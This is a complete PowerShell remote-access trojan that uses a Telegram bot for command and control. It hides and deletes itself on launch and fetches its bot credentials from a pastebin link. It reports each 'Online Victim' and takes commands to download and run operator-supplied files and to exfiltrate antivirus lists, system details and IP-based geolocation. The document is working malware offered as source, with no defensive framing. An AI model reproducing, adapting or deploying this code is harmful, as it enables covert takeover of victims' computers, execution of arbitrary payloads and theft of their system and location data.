# Functions #
$curl = "C:\Windows\System32\curl.exe";
function Request($url){
	$string = cmd.exe /c $curl $url -s -k;
	return [string]$string;
}
function Send_Message($message){
	$url = "https://api.telegram.org/bot" + $token + "/sendMessage?text=" + $message + "&chat_id=" + $chat_id;
	cmd.exe /c $curl $url -s -k;
}
function Online{
	Send_Message("%F0%9F%98%88%20Online Victim %5B " + $env:UserName + " %5D");
}
function Get_LastMessage($string){
	return (Select-String 'message":{(.*?)}}' -input $string -AllMatches | Foreach {$_.matches})[-1].Groups[1].value;
}
function Get_Text($string){
	return (Select-String 'text":"(.*?)",' -input $string -AllMatches | Foreach {$_.matches}).Groups[1].value;
}
function Get_Date($string){
	return (Select-String 'date":(.*?),' -input $string -AllMatches | Foreach {$_.matches}).Groups[1].value;
}
function Get_FileId($string){
	return (Select-String 'file_id":"(.*?)"' -input $string -AllMatches | Foreach {$_.matches}).Groups[1].value;
}
function Get_Caption($string){
	return (Select-String 'caption":"(.*?)"' -input $string -AllMatches | Foreach {$_.matches}).Groups[1].value;
}
function Get_FilePath($string){
	return (Select-String 'file_path":"(.*?)"' -input $string -AllMatches | Foreach {$_.matches}).Groups[1].value;
}
function Get_AntiVirus{
    [CmdletBinding()]
    param (
    [parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
    [Alias('name')]
    $computername=$env:computername
    )
     $AntiVirusProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct  -ComputerName $computername
    $ret = "%F0%9F%9B%A1 AntiVirus List :%0A";
	if ($AntiVirusProducts.length -eq $null){
        $ret += "%E2%9D%96 Not Found%0A";
	}
	else{
		foreach($AntiVirusProduct in $AntiVirusProducts){
			$ret += "%E2%9D%96 " + $AntiVirusProduct.displayName + "%0A";
		}
	}
    return $ret + "$0A--" + $env:UserName + "--";
} 
function Get_SystemInfo{
	$info = "%F0%9F%96%A5 System Info : %0A";
	$info += "%E2%9D%96 Username : " + $env:UserName + "%0A";
	$info += "%E2%9D%96 OS Name : " + (Get-WmiObject Win32_OperatingSystem).Name.split("|")[0] + "%0A";
	$info += "%E2%9D%96 RAM : " + (systeminfo | Select-String 'Total Physical Memory:').ToString().Split(':')[1].Trim() + "%0A";
	$info += "%E2%9D%96 CPU : " + (Get-ItemProperty -Path "HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0\" -Name ProcessorNameString).ProcessorNameString + "%0A";
	if ([Environment]::Is64BitOperatingSystem){
		$info += "%E2%9D%96 Bit : 64%0A";
	}
	else{
		$info += "%E2%9D%96 Bit : 32%0A";
	}
	$info += "%E2%9D%96 Default Browser : " + (Get-ItemProperty -Path "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.html\UserChoice" -Name Progid).Progid + "%0A";
	return $info + "$0A--" + $env:UserName + "--";
}
function Get_Geo{
	$info = "%F0%9F%8C%8E System Info : %0A";
	$restUrl = "http://ip-api.com/json/"
	$result = Request($restUrl);
	$result -match '"query":"(.*?)"';
	$info += "%E2%9D%96 IP Address : " + $Matches[1] + "%0A";
	$result -match '"country":"(.*?)"';
	$info += "%E2%9D%96 Country : " + $Matches[1] + "%0A";
	$result -match '"regionName":"(.*?)"';
	$info += "%E2%9D%96 Region Name : " + $Matches[1] + "%0A";
	$result -match '"city":"(.*?)"';
	$info += "%E2%9D%96 City : " + $Matches[1] + "%0A";
	$result -match '"countryCode":"(.*?)"';
	$info += "%E2%9D%96 Country Code : " + $Matches[1] + "%0A";
	$result -match '"lat":"(.*?)"';
	$info += "%E2%9D%96 Lat : " + $Matches[1] + "%0A";
	$result -match '"lon":"(.*?)"';
	$info += "%E2%9D%96 Lon : " + $Matches[1] + "%0A";
	$info += "%E2%9D%96 MAP : https://extreme-ip-lookup.com/" +  $result[0].query + "%0A";
	return ($info + "$0A--" + $env:UserName + "--");
}
function StartOn($num){
	$num1 = $num -1 ;
	$filename = "C:\Users\" + $env:Username + "\tmp";
	$exists = Test-Path $filename;
	if ($exists -eq $false){
		Set-Content $filename 1;
		exit;
	}
	else
	{
		$num2 = [int](Get-Content $filename);
		if ($num1 -ne $num2){
			$num2 += 1;
			Set-Content $filename $num2;
			exit;
		}
	}
}
# End Functions #
$me = (Get-Variable MyInvocation -Scope Script).Value.MyCommand.Path;
If ($args[0] -ne $true){
	Start-Process -NoNewWindow powershell.exe -ArgumentList ("-File " + $me + " " + $true);
	sleep 3;
	rm $me;
	exit;
}
#StartOn(2);
$pastebin = "https://pastebin.com/raw/nx353a7L";
$string = Request($pastebin);
$token = $string.split(" ")[0];
$chat_id = $string.split(" ")[1];
$new_id = "";
$old_id = "";
Online;
$json = Request("https://api.telegram.org/bot" + $token + "/getUpdates");
$json = Get_LastMessage($json);
$old_id = Get_Date($json);
while($true){
	$json = Request("https://api.telegram.org/bot" + $token + "/getUpdates");
	$json = Get_LastMessage($json);
	$new_id = Get_Date($json);
	if($old_id -ne $new_id){
		$old_id = $new_id;
		$file_id = Get_FileId($json);
		echo $file_id.length;
		if($file_id.length -ne $null -And $file_id.length -ne 0){
			$username = $env:UserName;
			$caption = Get_Caption($json);
			if($username = $caption -Or $caption -eq "All")
			{
				$json = Request("https://api.telegram.org/bot" + $token + "/getFile?file_id=" + $file_id);
				$link = Get_FilePath($json);
				$link = "https://api.telegram.org/file/bot" + $token + "/" + $link;
				$output = $env:TEMP + "\" + $link.split("/")[-1];
				$args = " -o " + """" +  $output + """" + " """ + $link + """ -k -s";
				$psi = New-object System.Diagnostics.ProcessStartInfo;
				$psi.CreateNoWindow = $true;
				$psi.UseShellExecute = $false;
				$psi.RedirectStandardOutput = $true;
				$psi.RedirectStandardError = $true;
				$psi.FileName = $curl;
				$psi.Arguments = $args;
				$process = New-Object System.Diagnostics.Process;
				$process.StartInfo = $psi;
				[void]$process.Start();
				$process.WaitForExit();
				Start-Process $output;
				Send_Message("%E2%9C%94%EF%B8%8F File Uploaded %26 Executed%0A--" + $env:UserName + "--");
			}
		}
		else
		{
			$recv = Get_Text($json);
			$command = $recv.split(" ")[0];
			if($command -eq "/list"){
				Online;
			}
			elseif($command -eq "/quit" -And ($env:UserName -eq $recv.split(" ")[1] -Or $recv.split(" ")[1] -eq "All")){
				exit;
			}
			elseif($command -eq "/antivirus" -And ($env:UserName -eq $recv.split(" ")[1] -Or $recv.split(" ")[1] -eq "All")){
				Send_Message(Get_AntiVirus);
			}
			elseif($command -eq "/system_info" -And ($env:UserName -eq $recv.split(" ")[1] -Or $recv.split(" ")[1] -eq "All")){
				Send_Message(Get_SystemInfo);
			}
			elseif($command -eq "/geo" -And ($env:UserName -eq $recv.split(" ")[1] -Or $recv.split(" ")[1] -eq "All")){
				Send_Message((((Get_Geo) -replace "True","") -replace "False",""));
			}
		}
	}
}
